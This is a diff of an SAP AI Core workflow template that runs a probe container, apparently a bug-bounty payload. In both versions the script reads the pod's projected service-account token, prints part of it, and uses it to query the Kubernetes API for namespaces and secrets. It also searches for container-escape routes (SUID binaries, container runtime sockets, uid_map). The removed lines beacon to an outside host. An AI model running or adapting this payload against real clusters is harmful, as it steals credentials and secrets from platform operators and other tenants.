@@ -10,11 +10,11 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "39.0.0"
+    ai.sap.com/version: "40.0.0"
 spec:
   entrypoint: main
   volumes:
-  - name: projected-token
+  - name: proj-token
     projected:
       sources:
       - serviceAccountToken:
@@ -29,31 +29,23 @@ spec:
     container:
       image: nicolaka/netshoot:latest
       volumeMounts:
-      - name: projected-token
-        mountPath: /var/run/projected
+      - name: proj-token
+        mountPath: /var/run/proj
       command:
       - bash
       - -c
       - |
-        echo "=== V39 CROSS-NS REFERENCE ==="
-        NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo unknown)
-        echo "NS: $NS"
-        echo "=== PROJECTED TOKEN ==="
-        ls -la /var/run/projected/ 2>/dev/null || echo "Mount failed"
-        PTOKEN=$(cat /var/run/projected/token 2>/dev/null)
-        echo "Len: ${#PTOKEN}"
-        if [ -n "$PTOKEN" ]; then
-          echo "GOT TOKEN"
-          echo "$PTOKEN" | head -c 200
-          echo ""
-          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 400
-          echo ""
-          curl -sk -H "Authorization: Bearer $PTOKEN" https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets 2>&1 | head -c 400
+        exec 2>&1
+        echo "V40"
+        echo "PROJ=$(ls /var/run/proj/ 2>/dev/null || echo NOMOUNT)"
+        T=$(cat /var/run/proj/token 2>/dev/null)
+        echo "TLEN=${#T}"
+        if [ -n "$T" ]; then
+          echo "T200=$(echo $T | head -c 200)"
+          echo "NS=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -c 300)"
+          echo "SEC=$(curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/secrets 2>&1 | head -c 300)"
         fi
-        echo "=== ESCAPE ==="
-        find / -perm -4000 2>/dev/null | head -3
-        ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo "No sockets"
-        cat /proc/self/uid_map 2>/dev/null
-        mount | grep -v "proc\|sys\|dev\|overlay\|tmpfs" | head -3
-        curl -s "https://www.masonhck.tech/ssrf.php?src=v39" | head -c 5
-        echo "=== V39 DONE ==="
+        echo "SUID=$(find / -perm -4000 2>/dev/null | head -3)"
+        echo "SOCK=$(ls /run/containerd/containerd.sock /var/run/docker.sock 2>/dev/null || echo NONE)"
+        echo "UID=$(cat /proc/self/uid_map 2>/dev/null)"
+        echo "V40DONE"
